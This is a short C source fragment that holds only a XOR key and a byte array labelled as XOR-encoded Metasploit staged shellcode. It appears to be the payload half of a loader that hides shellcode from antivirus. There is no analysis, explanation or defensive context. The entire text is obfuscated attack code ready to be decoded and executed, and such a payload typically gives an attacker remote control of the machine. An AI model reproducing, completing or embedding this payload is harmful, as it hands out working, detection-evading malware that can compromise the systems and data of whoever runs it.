unsigned char key[] = "salut";

unsigned char xored_metasploit_staged_shellcode[] =
		"\x8f\x29\xef\x91\x84\x9b\xad\x6c\x75\x74\x32\x30\x2d\x25\x26"
		"\x3b\x50\xbe\x24\x22\x16\x29\xe7\x27\x14\x3b\xea\x3e\x6d\x3c"
		"\xf8\x33\x4c\x3d\xff\x01\x31\x21\x44\xbd\x3b\x6e\xdb\x3f\x3e"
		"\x3b\x50\xac\xd9\x48\x12\x1d\x6e\x59\x54\x32\xa0\xa5\x78\x35"
		"\x72\xa0\x8e\x98\x26\x32\x30\x24\xfe\x26\x53\xea\x2e\x49\x3c"
		"\x72\xb1\x0a\xf4\x0c\x6b\x6a\x6e\x7a\xf1\x01\x61\x6c\x75\xff"
		"\xf3\xe9\x6c\x75\x74\x3b\xe4\xac\x01\x13\x3b\x60\xbc\x31\xff"
		"\x33\x41\xe7\x3d\x6c\x23\x28\x6d\xa5\x97\x25\x2c\x5d\xbc\x3c"
		"\x8c\xa8\x2d\xfe\x40\xfb\x29\x6d\xa3\x3c\x42\xa1\x2d\xb4\xbd"
		"\x7e\xcd\x2d\x74\xb5\x4b\x81\x19\x84\x38\x70\x2d\x48\x7d\x31"
		"\x4a\xb0\x19\xad\x2c\x37\xea\x2c\x51\x3d\x72\xb1\x0a\x34\xff"
		"\x7f\x29\x28\xfe\x34\x6f\x28\x6d\xa5\x35\xf8\x65\xe4\x3d\x75"
		"\xa3\x20\x34\x34\x2c\x2d\x38\x36\x34\x2c\x32\x38\x2d\x2f\x3c"
		"\xf0\x8d\x4c\x34\x26\x8c\x81\x34\x34\x2d\x29\x29\xe7\x67\x9d"
		"\x38\x9e\x93\x8a\x29\x3a\xdf\x1b\x06\x46\x2c\x52\x5e\x75\x74"
		"\x32\x37\x25\xfc\x92\x3b\xe0\x80\xd5\x75\x73\x61\x25\xfc\x91"
		"\x3a\xdd\x6e\x75\x6b\xe3\xa1\xc4\x64\xf1\x32\x35\x25\xfc\x90"
		"\x3f\xe8\x9d\x34\xce\x3f\x16\x4a\x72\x8b\xa6\x2d\xe5\x9f\x1c"
		"\x72\x60\x6c\x75\x2d\x32\xdb\x45\xf5\x1f\x73\x9e\xb9\x1f\x7e"
		"\x32\x3f\x3c\x25\x39\x42\xa8\x21\x44\xb4\x3b\x9e\xac\x3d\xfd"
		"\xb1\x29\x93\xb5\x3c\xfa\xa0\x2d\xcf\x9e\x7c\xbe\x8c\x8a\xa1"
		"\x3b\xe8\xab\x1f\x64\x32\x39\x20\xfc\x96\x3b\xe8\x95\x34\xce"
		"\xea\xc4\x18\x14\x8b\xa6\xe4\xac\x01\x7e\x3a\x9e\xa2\x00\x91"
		"\x9b\xf2\x6c\x75\x74\x3b\xe2\x80\x65\x3c\xfa\x83\x21\x44\xbd"
		"\x19\x65\x2d\x2d\x3c\xfa\x98\x2d\xcf\x76\xaa\xa9\x33\x8a\xa1"
		"\xf0\x99\x6c\x0b\x21\x3b\xe2\xa8\x55\x2a\xfa\x97\x06\x35\x35"
		"\x2a\x09\x6c\x65\x74\x73\x20\x34\x3d\xfd\x81\x29\x5d\xbc\x35"
		"\xc9\x39\xc8\x26\x91\x8c\xb4\x24\xfc\xb7\x3a\xe8\xab\x38\x45"
		"\xba\x28\xe5\x85\x3c\xfa\xbb\x24\xfc\x8d\x32\xdb\x6e\xac\xbc"
		"\x2c\x9e\xb9\xf6\x8c\x73\x1c\x44\x2d\x35\x24\x38\x04\x75\x34"
		"\x73\x61\x2d\x2d\x1e\x73\x3b\x2d\xcf\x7f\x5c\x6e\x5c\x8a\xa1"
		"\x24\x38\x2d\xcf\x01\x1d\x2c\x0d\x8a\xa1\x3a\x9e\xa2\x9c\x48"
		"\x8c\x9e\x93\x3d\x75\xb0\x29\x45\xb3\x3c\xf6\x97\x19\xc1\x35"
		"\x8c\x86\x34\x1f\x74\x2a\x28\xab\xb7\x84\xc6\xc3\x3a\x8a\xa1";
